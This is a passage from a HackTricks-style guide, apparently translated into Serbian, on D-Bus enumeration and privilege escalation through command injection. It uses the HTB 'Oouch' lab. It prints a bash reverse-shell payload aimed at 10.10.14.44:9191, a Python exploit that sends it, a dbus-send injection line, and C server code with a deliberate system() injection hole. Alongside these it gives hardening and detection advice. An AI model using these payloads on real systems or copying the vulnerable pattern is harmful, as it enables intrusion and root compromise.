# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus se koristi kao posrednik za inter-process communications (IPC) u Ubuntu desktop okruženjima. Na Ubuntu-u se primećuje istovremeni rad nekoliko message buses: system bus, prvenstveno korišćen od strane **privileged services za izlaganje servisa relevantnih za ceo sistem**, i session bus za svakog prijavljenog korisnika, koji izlaže servise relevantne samo za tog konkretnog korisnika. Ovde je fokus prvenstveno na system bus zbog njegove povezanosti sa servisima koji rade sa višim privilegijama (npr. root), pošto nam je cilj da podignemo privilegije. Zabeleženo je da D-Bus arhitektura koristi 'router' po svakom session bus-u, koji je odgovoran za preusmeravanje poruka klijenata ka odgovarajućim servisima na osnovu adrese koju klijenti navedu za servis sa kojim žele da komuniciraju.

Servisi na D-Bus-u su definisani pomoću **objects** i **interfaces** koje izlažu. Objects se mogu porediti sa klasnim instancama u standardnim OOP jezicima, pri čemu je svaka instanca jedinstveno identifikovana pomoću **object path**. Ova putanja, slična filesystem path, jedinstveno identifikuje svaki object koji servis izlaže. Ključna interface za istraživačke svrhe je **org.freedesktop.DBus.Introspectable** interface, koja sadrži jednu metodu, Introspect. Ova metoda vraća XML reprezentaciju podržanih methods, signals i properties za objekat, s fokusom ovde na methods, uz izostavljanje properties i signals.

Za komunikaciju sa D-Bus interface korišćena su dva alata: CLI alat pod imenom **gdbus** za lako pozivanje methods izloženih preko D-Bus-a u skriptama, i [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), Python-based GUI alat dizajniran za enumeraciju servisa dostupnih na svakom bus-u i za prikazivanje objects sadržanih unutar svakog servisa.
```bash
sudo apt-get install d-feet
```
Ako proveravate **session bus**, prvo potvrdite trenutnu adresu:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

U prvoj slici prikazane su servisi registrovani sa D-Bus system bus, pri čemu je **org.debin.apt** posebno istaknut nakon izbora dugmeta System Bus. D-Feet upituje ovaj servis za objekte, prikazujući interface, methods, properties i signals za izabrane objekte, kao što se vidi na drugoj slici. Takođe je detaljno prikazan signature svakog method.

Značajna mogućnost je prikaz servisiovog **process ID (pid)** i **command line**, što je korisno za potvrdu da li servis radi sa povišenim privilegijama, što je važno za relevantnost istraživanja.

**D-Feet takođe omogućava pozivanje method**: korisnici mogu da unesu Python izraze kao parametre, koje D-Feet zatim konvertuje u D-Bus types pre prosleđivanja servisu.

Međutim, imajte na umu da **neki methods zahtevaju authentication** pre nego što nam dozvole da ih pozovemo. Ove methods ćemo ignorisati, jer je naš cilj da podignemo privilegije bez credentials već na početku.

Takođe imajte na umu da neki od servisa upituju drugi D-Bus servis pod imenom org.freedeskto.PolicyKit1 da li korisniku treba dozvoliti da izvrši određene akcije ili ne.

## **Cmd line Enumeration**

### List Service Objects

Moguće je izlistati otvorene D-Bus interfaces sa:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Servisi označeni kao **`(activatable)`** su posebno zanimljivi zato što **još nisu pokrenuti**, ali bus request ih može pokrenuti po potrebi. Ne zaustavljaj se na `busctl list`; mapiraj ta imena na stvarne binarne fajlove koje bi izvršili.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
To brzo pokazuje koji će `Exec=` path biti pokrenut za activatable ime i pod kojim identitetom. Ako je binary ili njegov execution chain slabo zaštićen, inactive service i dalje može postati put za privilege-escalation.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Kada proces uspostavi connection to a bus, bus dodeljuje toj connection poseban bus name koji se zove _unique connection name_. Bus names ovog tipa su immutable—garantovano je da se neće promeniti sve dok connection postoji—and, još važnije, ne mogu se ponovo koristiti tokom lifetime-a bus-a. To znači da nijedna druga connection to that bus nikada neće dobiti takav unique connection name, čak i ako isti process zatvori connection to the bus i napravi novu. Unique connection names su lako prepoznatljivi jer počinju sa inače zabranjenim znakom dvotačke.

### Service Object Info

Zatim, možete dobiti neke informacije o interface sa:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Takođe korelirajte ime bus-a sa njegovim `systemd` unitom i putanjom izvršne datoteke:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Ovo odgovara na operativno pitanje koje je bitno tokom privesc: **ako poziv metode uspe, koji će stvarni binary i unit izvršiti radnju?**

### List Interfaces of a Service Object

Morate imati dovoljno permissions.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspektuj Interface Service Object

Obratite pažnju kako je u ovom primeru izabran najnoviji interface otkriven pomoću `tree` parametra (_vidi prethodni odeljak_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Napomenite metod `.Block` interfejsa `htb.oouch.Block` (onaj koji nas zanima). "s" u drugim kolonama možda znači da očekuje string.

Pre nego što pokušate bilo šta opasno, prvo validirajte **read-oriented** ili na drugi način low-risk metod. Ovo jasno razdvaja tri slučaja: pogrešna sintaksa, dostupan ali odbijen, ili dostupan i dozvoljen.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Poveži D-Bus Methods sa politikama i akcijama

Introspection ti govori **šta** možeš da pozoveš, ali ne govori **zašto** je poziv dozvoljen ili odbijen. Za stvarni privesc triage obično treba da pregledaš **tri sloja zajedno**:

1. **Activation metadata** (`.service` fajlovi ili `SystemdService=`) da saznaš koji će se binary i unit zaista pokrenuti.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) da saznaš ko može da `own`, `send_destination`, ili `receive_sender`.
3. **Polkit action fajlovi** (`/usr/share/polkit-1/actions/*.policy`) da saznaš podrazumevani authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Korisne komande:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Do **not** assume a 1:1 mapping between a D-Bus method and a Polkit action. Ista metoda može izabrati drugačiju akciju u zavisnosti od objekta koji se menja ili runtime context-a. Zato je praktičan workflow:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` i grep odgovarajućih `.policy` fajlova
3. low-risk live probe-ovi sa `busctl call`, `gdbus call`, ili `dbusmap --enable-probes --null-agent`

Proxy ili compatibility servisi zaslužuju dodatnu pažnju. **root-running proxy** koji prosleđuje zahteve drugom D-Bus servisu preko sopstvene unapred uspostavljene konekcije može slučajno naterati backend da svaki zahtev tretira kao da dolazi od UID 0, osim ako originalni identitet pozivaoca nije ponovo validiran.

### Monitor/Capture Interface

Sa dovoljno privilegija (samo `send_destination` i `receive_sender` privilegije nisu dovoljne) možete **monitorisati D-Bus communication**.

Da biste **monitorisali** **communication** moraćete da budete **root.** Ako i dalje imate problema iako ste root, pogledajte [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) i [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Ako znate kako da konfigurišete D-Bus config fajl da **allow non root users to sniff** communication, molim vas **contact me**!

Different ways to monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
U sledećem primeru interfejs `htb.oouch.Block` je nadziran i **poruka "**_**lalalalal**_**" se šalje kroz miscommunication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Možete koristiti `capture` umesto `monitor` da sačuvate rezultate u **pcapng** fajlu koji Wireshark može da otvori:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtriranje celokupnog šuma <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ako ima previše informacija na bus-u, prosledi match rule ovako:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Može se navesti više pravila. Ako poruka odgovara _bilo kom_ od pravila, poruka će biti ispisana. Na primer:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Pogledajte [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) za više informacija o syntax pravilima match-a.

### More

`busctl` ima još više opcija, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

Kao user **qtc unutar hosta "oouch" sa HTB** možete pronaći **unexpected D-Bus config file** lociran u _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Napomena iz prethodne konfiguracije da **ćete morati biti korisnik `root` ili `www-data` da biste slali i primali informacije** putem ove D-BUS komunikacije.

Kao korisnik **qtc** unutar docker kontejnera **aeb4525789d8** možete pronaći neki dbus-related kod u fajlu _/code/oouch/routes.py._ Ovo je zanimljiv kod:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kao što možete da vidite, on se **povezuje na D-Bus interfejs** i šalje **"client_ip"** funkciji **"Block"**.

Sa druge strane D-Bus konekcije radi neki C kompajlirani binarni fajl. Ovaj kod **osluškuje** D-Bus konekciju **za IP adresu i poziva iptables preko `system` funkcije** da blokira datu IP adresu.\
**Poziv `system` je namerno ranjiv na command injection**, pa će payload poput sledećeg napraviti reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Na kraju ove stranice možete pronaći **kompletan C kod D-Bus aplikacije**. U njemu možete pronaći između linija 91-97 **kako su `D-Bus object path`** i **`interface name`** **registrovani**. Ova informacija će biti neophodna da biste poslali informacije D-Bus konekciji:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Takođe, u liniji 57 možete pronaći da je **jedini registrovani metod** za ovu D-Bus komunikaciju nazvan `Block`(_**Zato će u sledećoj sekciji payload-ovi biti poslati service objektu `htb.oouch.Block`, interfejsu `/htb/oouch/Block` i nazivu metode `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Sledeći python kod će poslati payload na D-Bus konekciju do `Block` metode preko `block_iface.Block(runme)` (_napomena da je izdvojen iz prethodnog dela koda_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl and dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` je alat koji se koristi za slanje poruka na “Message Bus”
- Message Bus – Softver koji sistemi koriste da bi olakšali komunikaciju između aplikacija. Povezan je sa Message Queue (poruke su poređane sekvencijalno), ali kod Message Bus poruke se šalju u subscription modelu i takođe je veoma brz.
- “-system” tag se koristi da označi da je to sistemska poruka, a ne session poruka (podrazumevano).
- “–print-reply” tag se koristi da pravilno ispiše našu poruku i primi sve replies u formatu čitljivom za čoveka.
- “–dest=Dbus-Interface-Block” Adresa Dbus interfejsa.
- “–string:” – Tip poruke koji želimo da pošaljemo interfejsu. Postoji više formata slanja poruka kao što su double, bytes, booleans, int, objpath. Od toga je “object path” koristan kada želimo da pošaljemo putanju fajla na Dbus interfejs. U ovom slučaju možemo koristiti specijalan fajl (FIFO) da prosledimo komandu interfejsu pod imenom fajla. “string:;” – Ovo se koristi da ponovo pozovemo object path gde postavljamo FIFO reverse shell fajl/command.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

Enumeracija velike D-Bus attack surface ručno pomoću `busctl`/`gdbus` brzo postaje naporna. Dva mala FOSS uslužna programa objavljena u poslednjih nekoliko godina mogu ubrzati posao tokom red-team ili CTF angažmana:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Napisano u C; jedan statički binary (<50 kB) koji prolazi kroz svaki object path, preuzima `Introspect` XML i mapira ga na vlasnički PID/UID.
* Korisne flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Alat označava nezaštićena well-known names sa `!`, odmah otkrivajući servise koje možete *own* (preuzeti) ili method calls koje su dostupne iz neprivilegovanog shell-a.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Python-only script koji traži *writable* path-ove u systemd unit-ovima **i** previše permisivne D-Bus policy fajlove (npr. `send_destination="*"`).
* Brzo korišćenje:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module pretražuje direktorijume ispod i ističe svaki servis koji normalan user može da spoofuje ili hijackuje:
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

Praćenje nedavno objavljenih CVE-ova pomaže u otkrivanju sličnih nesigurnih obrazaca u custom code-u. Dva dobra skorija primera su:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Servis koji radi kao root izlagao je D-Bus interface koji neprivilegovani user-i mogli da reconfigure, uključujući učitavanje macro behavior pod kontrolom napadača. | Ako daemon izlaže **device/profile/config management** na system bus-u, tretirajte writable configuration i macro features kao code-execution primitive, a ne samo kao "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Root-running compatibility proxy prosleđivao je requests backend servisima bez očuvanja originalnog security context-a pozivaoca, pa su backend-ovi verovali proxy-ju kao UID 0. | Tretirajte **proxy / bridge / compatibility** D-Bus servise kao posebnu klasu bug-ova: ako prosleđuju privilegovane calls, proverite kako caller UID/Polkit context stiže do backend-a. |

Obrasci koje treba primetiti:
1. Servis radi **kao root na system bus-u**.
2. Ili ne postoji **authorization check**, ili se check izvršava nad **pogrešnim subject-om**.
3. Dostupna metoda na kraju menja system state: package install, user/group promene, bootloader config, device profile updates, file writes, ili direktno command execution.

Koristite `dbusmap --enable-probes` ili ručni `busctl call` da potvrdite da li je metoda dostupna, zatim pregledajte policy XML servisa i Polkit actions da biste razumeli **koji subject** se zapravo autorizuje.

---

## Hardening & Detection Quick-Wins

* Potražite world-writable ili *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Zahtevajte Polkit za opasne metode – čak i *root* proxy-ji treba da proslede *caller* PID do `polkit_authority_check_authorization_sync()` umesto sopstvenog.
* Uklonite privilegije u dugotrajnim helper-ima (koristite `sd_pid_get_owner_uid()` da prebacite namespace-ove nakon povezivanja na bus).
* Ako ne možete da uklonite servis, makar ga *scope*-ujte na namensku Unix grupu i ograničite pristup u njegovom XML policy-ju.
* Blue-team: snimite system bus sa `busctl capture > /var/log/dbus_$(date +%F).pcapng` i importujte ga u Wireshark za anomaly detection.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
